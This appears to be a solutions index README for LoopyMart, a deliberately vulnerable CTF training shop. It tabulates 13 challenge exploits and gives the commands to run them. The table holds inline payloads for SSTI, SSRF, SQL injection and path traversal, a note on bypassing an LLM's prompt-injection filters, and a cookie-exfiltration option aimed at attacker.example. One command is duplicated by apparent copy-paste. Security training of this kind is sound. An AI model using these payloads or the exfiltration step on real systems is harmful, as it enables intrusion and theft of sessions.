# LoopyMart CTF — Solutions Index

This folder contains automated exploit scripts for every intentional
vulnerability in the LoopyMart security-training platform.

> **Note:** Never run these against systems you do not own or have
> explicit permission to test.

---

## Quick Reference

| # | Folder | Challenge ID | Category | Difficulty | Technique |
|---|---|---|---|---|---|
| 1 | [wishlist-ssti/](wishlist-ssti/) | `wishlist_ssti` | Web / SSTI | Medium | Jinja2 `Template(user_input).render()` — `{{ flag }}` → flag |
| 2 | [ssrf-invoice/](ssrf-invoice/) | `ssrf_invoice` | Web / SSRF | Medium | `<iframe src="http://127.0.0.1:8001/flag.txt">` in PDF address field |
| 3 | [spin-wheel-weak-prng/](spin-wheel-weak-prng/) | `spin_wheel` | Crypto / Weak PRNG | Easy–Medium | Mirror `random.seed(time.time())` locally → spin at exact second |
| 4 | [llm-prompt-injection/](llm-prompt-injection/) | *(system prompt)* | AI / LLM Security | Hard | Hex-continuation bait bypasses both input and output filters |
| 5 | [path-traversal-profile/](path-traversal-profile/) | `path_traversal` | Web / Path Traversal | Easy–Medium | `../` in `filename` param → `/tmp/path_traversal_flag.txt` |
| 6 | [sqli-forgot-password/](sqli-forgot-password/) | `sqli_forgot` | Web / SQLi | Easy–Medium | `' OR '1'='1' --` in email field of raw SQL f-string |
| 7 | [idor-uuid-sandwich/](idor-uuid-sandwich/) | `idor_uuid_sandwich` | Web / IDOR | Medium | UUIDv1 timestamp enumeration between bracket UUIDs → no-ownership check |
| 8 | [mass-assignment-plus/](mass-assignment-plus/) | `mass_assignment_plus` | Web / Mass Assignment | Easy–Medium | Blindly `setattr()` request body keys onto SQLAlchemy User model |
| 9 | [wallet-race-condition/](wallet-race-condition/) | `wallet_race` | Web / Race Condition | Medium–Hard | Concurrent `POST /wallet/redeem` TOCTOU → multiply cashback → buy flag |
| 10 | [sensitive-files-enum/](sensitive-files-enum/) | *(recon utility)* | Recon | Easy | Async unauthenticated probe of 175+ common sensitive paths |
| 11 | [puppeteer-mock-cookie/](puppeteer-mock-cookie/) | `puppeteer_mock_cookie` | Web / Cookie Security | Easy–Medium | Admin JWT → `mock_flag` cookie (not HttpOnly) read by Puppeteer |
| 12 | [stored-xss-bleach-mxss/](stored-xss-bleach-mxss/) | `stored_xss_bleach_mxss` | Web / Stored XSS | Hard | CVE-2021-23980: bleach 3.2.3 mXSS + regex bypass via HTML entity encoding |
| 13 | [vendor-traversal/](vendor-traversal/) | `vendor_traversal` | Web / Dir Listing / Path Traversal | Easy–Medium | Real folder tree at `/vendor`; `internal-ops/flag.txt` exposed via directory listing (CWE-548) + CWE-22 `../` traversal to `/tmp` |

---

## Running All Solvers

```bash
# Set common env vars
EMAIL="user@example.com"
PASS="yourpassword"
ADMIN_EMAIL="admin@example.com"
ADMIN_PASS="adminpassword"
URL="http://localhost:8001"

# 1 — SSTI
python solutions/wishlist-ssti/solve.py       --email $EMAIL --password $PASS --url $URL

# 2 — SSRF
python solutions/ssrf-invoice/solve.py        --email $EMAIL --password $PASS --url $URL

# 3 — Weak PRNG
python solutions/spin-wheel-weak-prng/solve.py --url $URL

# 4 — LLM Prompt Injection
python solutions/llm-prompt-injection/solve.py --email $EMAIL --password $PASS --url $URL

# 5 — Path Traversal
python solutions/path-traversal-profile/solve.py --email $EMAIL --password $PASS --url $URL

# 6 — SQL Injection
python solutions/sqli-forgot-password/solve.py --url $URL

# 7 — IDOR UUID Sandwich
python solutions/idor-uuid-sandwich/solve.py   --email $EMAIL --password $PASS --url $URL

# 8 — Mass Assignment
python solutions/mass-assignment-plus/solve.py --email $EMAIL --password $PASS --url $URL

# 9 — Race Condition
python solutions/wallet-race-condition/solve.py --email $EMAIL --password $PASS --url $URL

# 10 — Sensitive File Enumeration (no creds needed)
python solutions/sensitive-files-enum/solve.py --url $URL

# 11 — Puppeteer Cookie Exfiltration (admin creds required)
# Option A: Node / Puppeteer
cd solutions/puppeteer-mock-cookie && npm install
node solve.js --email $ADMIN_EMAIL --password $ADMIN_PASS --url $URL
cd -

# Option B: Python fallback
python solutions/puppeteer-mock-cookie/solve.py --email $ADMIN_EMAIL --password $ADMIN_PASS --url $URL

# 12 — Stored XSS via bleach mXSS (CVE-2021-23980) — user creds with delivered order
python solutions/stored-xss-bleach-mxss/solve.py --email $EMAIL --password $PASS --url $URL
# exfiltrate cookies to your server:
python solutions/stored-xss-bleach-mxss/solve.py --email $EMAIL --password $PASS --url $URL --exfil https://attacker.example/steal

# Option B: Python fallback  
python solutions/puppeteer-mock-cookie/solve.py --email $ADMIN_EMAIL --password $ADMIN_PASS --url $URL

# 13 — Vendor Directory Listing + Path Traversal (no creds needed)
python solutions/vendor-traversal/solve.py --url $URL
```

---

## File Shape Convention

Every solution folder follows this structure:

```
solutions/<slug>/
├── README.md    ← challenge description, exploitation steps, mitigation
└── solve.py     ← automated CLI exploit (--email / --password / --url)
```

The Puppeteer challenge additionally provides:

```
solutions/puppeteer-mock-cookie/
├── README.md
├── solve.js       ← Puppeteer (Node.js) solver — browser cookie extraction
├── solve.py       ← Python fallback — HTTP-only, no browser needed
└── package.json   ← { "dependencies": { "puppeteer": "^22" } }
```

### `solve.py` / `solve.js` contract

| Behaviour | Requirement |
|---|---|
| Required CLI args | `--email`, `--password`, `--url` (default `http://localhost:8001`) |
| Success output | `[+] Flag: CTF{...}` printed to stdout |
| Exit codes | `0` on success, non-zero on failure |
| Self-contained | No files outside its own folder required |

---

## Adding a New Solution

See the [Adding a New CTF Solution](../README.md#adding-a-new-ctf-solution) section
in the root README for the full step-by-step guide, including:

1. Choose a kebab-case slug
2. Add flag to `backend/flags.yml`
3. Implement the backend vulnerability calling `get_flag()`
4. Create `solutions/<slug>/README.md` + `solve.py`
5. Test end-to-end
